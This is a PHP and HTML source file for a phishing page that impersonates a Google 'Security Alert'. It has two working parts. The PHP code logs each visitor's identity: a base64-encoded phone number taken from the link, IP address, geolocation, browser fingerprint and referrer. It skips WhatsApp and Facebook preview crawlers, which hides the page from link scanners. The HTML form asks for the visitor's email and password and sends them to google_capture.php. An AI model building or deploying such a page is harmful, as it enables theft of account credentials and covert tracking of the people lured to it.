<?php
date_default_timezone_set('Asia/Karachi');
require_once 'F:\xampp\htdocs\admins\db_connect.php';
require_once 'F:\xampp\htdocs\config.php';

function encodeNumber($number) {
    return base64_encode($number);
}

function decodeNumber($encoded) {
    return base64_decode($encoded);
}

function getOS($userAgent) {
    $osArray = [
        '/windows nt 10/i'     => 'Windows 10',
        '/windows nt 6.3/i'    => 'Windows 8.1',
        '/windows nt 6.2/i'    => 'Windows 8',
        '/windows nt 6.1/i'    => 'Windows 7',
        '/macintosh|mac os x/i'=> 'Mac OS X',
        '/linux/i'             => 'Linux',
        '/iphone/i'            => 'iPhone',
        '/ipad/i'              => 'iPad',
        '/android/i'           => 'Android',
    ];
    foreach ($osArray as $regex => $value) {
        if (preg_match($regex, $userAgent)) {
            return $value;
        }
    }
    return 'Unknown OS';
}

function getBrowser($userAgent) {
    $browserArray = [
        '/msie/i'      => 'Internet Explorer',
        '/firefox/i'   => 'Firefox',
        '/safari/i'    => 'Safari',
        '/chrome/i'    => 'Chrome',
        '/edge/i'      => 'Edge',
        '/opera/i'     => 'Opera',
        '/netscape/i'  => 'Netscape',
        '/maxthon/i'   => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i'    => 'Mobile Browser'
    ];
    foreach ($browserArray as $regex => $value) {
        if (preg_match($regex, $userAgent)) {
            return $value;
        }
    }
    return 'Unknown Browser';
}

function isMobile($userAgent) {
    return preg_match('/mobile|android|iphone|ipad/i', $userAgent) ? "YES" : "NO";
}

function getRealIP() {
    // Check for shared internet/ISP IP
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validateIP($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }

    // Check for IPs passing through proxies
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check if multiple IP addresses exist in var
        $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($iplist as $ip) {
            if (validateIP($ip)) {
                return $ip;
            }
        }
    }

    if (!empty($_SERVER['HTTP_X_FORWARDED']) && validateIP($_SERVER['HTTP_X_FORWARDED'])) {
        return $_SERVER['HTTP_X_FORWARDED'];
    }
    
    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validateIP($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    }
    
    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validateIP($_SERVER['HTTP_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_FORWARDED_FOR'];
    }
    
    if (!empty($_SERVER['HTTP_FORWARDED']) && validateIP($_SERVER['HTTP_FORWARDED'])) {
        return $_SERVER['HTTP_FORWARDED'];
    }

    // Return unreliable IP address since all else failed
    return $_SERVER['REMOTE_ADDR'];
}

function validateIP($ip) {
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    return true;
}

function getLocationDetails($ip) {
    // Check if IP is local or invalid
    if ($ip === '::1' || $ip === '127.0.0.1' || !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return [
            'country' => 'Local',
            'region' => 'Local',
            'city' => 'Local',
            'org' => 'Local Network'
        ];
    }

    // Try multiple IP geolocation services for better reliability
    $services = [
        "https://ipapi.co/{$ip}/json/",
        "https://ipinfo.io/{$ip}/json",
        "http://ip-api.com/json/{$ip}"
    ];
    
    foreach ($services as $url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($httpCode === 200 && $response) {
            $data = json_decode($response, true);
            
            // Format data based on service
            if (strpos($url, 'ipapi.co') !== false && !isset($data['error'])) {
                return [
                    'country' => $data['country_name'] ?? 'Unknown',
                    'region' => $data['region'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'org' => $data['org'] ?? 'Unknown'
                ];
            } elseif (strpos($url, 'ipinfo.io') !== false && !isset($data['error'])) {
                return [
                    'country' => $data['country'] ?? 'Unknown',
                    'region' => $data['region'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'org' => $data['org'] ?? 'Unknown'
                ];
            } elseif (strpos($url, 'ip-api.com') !== false && isset($data['status']) && $data['status'] === 'success') {
                return [
                    'country' => $data['country'] ?? 'Unknown',
                    'region' => $data['regionName'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'org' => $data['org'] ?? $data['isp'] ?? 'Unknown'
                ];
            }
        }
        
        // Small delay between requests
        usleep(100000);
    }
    
    // Fallback if all services fail
    return [
        'country' => 'Unknown',
        'region' => 'Unknown',
        'city' => 'Unknown',
        'org' => 'Unknown'
    ];
}

if (isset($_GET['number']) && isset($_GET['width']) && isset($_GET['height'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    // prevent bots from faking clicks
    if (stripos($ua, 'WhatsApp') !== false || stripos($ua, 'facebookexternalhit') !== false) {
        exit();
    }

    $encodedNumber = $_GET['number'];
    $actualNumber = decodeNumber($encodedNumber);
    
    // Ensure we have a valid number after decoding
    if (empty($actualNumber)) {
        die("Invalid contact number");
    }

    $group = $_GET['group_name'] ?? 'Unknown';
    
    // Get the website name from the URL path
    $currentPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    $url = 'Unknown Website';

    foreach ($websites as $name => $websiteUrl) {
        $websitePath = parse_url($websiteUrl, PHP_URL_PATH);
        $currentPath = rtrim($currentPath, '/');
        $websitePath = rtrim($websitePath, '/');
        
        if ($currentPath === $websitePath) {
            $url = $name;
            break;
        }
    }
    
    $clicked = date("Y-m-d H:i:s");
    $ip = getRealIP(); // Use the improved IP detection function
    $device = $ua;
    $os = getOS($device);
    $browser = getBrowser($device);
    $is_mobile = isMobile($ua);
    

    // unique token
    $token = bin2hex(random_bytes(16));

    // extra details from query (set by JS)
    $screen_resolution = ($_GET['width'] ?? '') . "x" . ($_GET['height'] ?? '');
    $color_depth       = $_GET['color_depth'] ?? '';
    $timezone          = $_GET['timezone'] ?? '';
    $webgl             = $_GET['webgl'] ?? '';
    $canvas            = $_GET['canvas'] ?? '';
    $fingerprint       = "Resolution:$screen_resolution|ColorDepth:$color_depth|Timezone:$timezone|WebGL:$webgl|Canvas:$canvas";

    // location - with improved error handling
    $location = getLocationDetails($ip);
    $country = $location['country'] ?? 'Unknown';
    $region  = $location['region'] ?? 'Unknown';
    $city    = $location['city'] ?? 'Unknown';
    $isp     = $location['org'] ?? 'Unknown';

    // language & referrer
    $language = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown', 0, 20);
    $referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

    // UTM parameters
    $utm_source   = $_GET['utm_source']   ?? 'N/A';
    $utm_medium   = $_GET['utm_medium']   ?? 'N/A';
    $utm_campaign = $_GET['utm_campaign'] ?? 'N/A';

    // Insert into DB
    $stmt = $conn->prepare("INSERT INTO trace_data 
        (contact, url, clicked_at, ip_address, device, os, group_name, browser, 
    fingerprint, country, region, city, isp, language, referrer, 
    utm_source, utm_medium, utm_campaign, token, screen_resolution, is_mobile) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    
    $stmt->bind_param("ssssssssssssssssssssi", 
        $actualNumber,
        $url, 
        $clicked, 
        $ip, 
        $device, 
        $os, 
        $group, 
        $browser, 
        $fingerprint, 
        $country, 
        $region, 
        $city, 
        $isp, 
        $language, 
        $referrer, 
        $utm_source, 
        $utm_medium, 
        $utm_campaign, 
        $token, 
        $screen_resolution, 
        $is_mobile);
    
    if (!$stmt->execute()) {
        error_log("Database error: " . $stmt->error);
        // Log the location data that failed
        error_log("Failed location data: " . print_r($location, true));
    }
    $stmt->close();
    
    // Debug output (remove in production)
    // echo "IP: $ip, Location: " . print_r($location, true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account Security</title>
    <link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8f9fa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 360px;
            padding: 20px;
            background: #ffffff;
            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.15);
            border-radius: 12px;
            text-align: center;
        }

        .logo {
            width: 110px;
            margin-bottom: 10px;
        }

        h2 {
            font-size: 20px;
            color: #333;
            margin-bottom: 10px;
        }

        p {
            font-size: 14px;
            color: #555;
            margin-bottom: 15px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 12px;
            align-items: center;
        }

        input {
            width: 95%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 15px;
            outline: none;
        }

        button {
            width: 95%;
            padding: 12px;
            background: #4285F4;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background: #357ae8;
        }

        .footer {
            font-size: 12px;
            color: #777;
            margin-top: 12px;
        }

        @media (max-width: 480px) {
            .container {
                width: 80%;
                padding: 16px;
            }

            .logo {
                width: 90px;
            }

            h2 {
                font-size: 18px;
            }

            p {
                font-size: 13px;
            }

            input, button {
                font-size: 14px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="googli.png" alt="Google" class="logo">
        <h2>Security Alert</h2>
        <p>We've detected suspicious activity on your account.</p>
        <p><strong>Immediate Action Required:</strong> Change your password to secure your account.</p>
        
        <form action="google_capture.php" method="POST">
            <label>Email or phone</label>
            <input type="text" name="email" required>

            <label>New Password</label>
            <input type="password" name="password" required>

            <button type="submit">Next</button>
        </form>

        <p class="footer">Google will never ask for your password over email or messages.</p>
    </div>
    
</body>
</html>
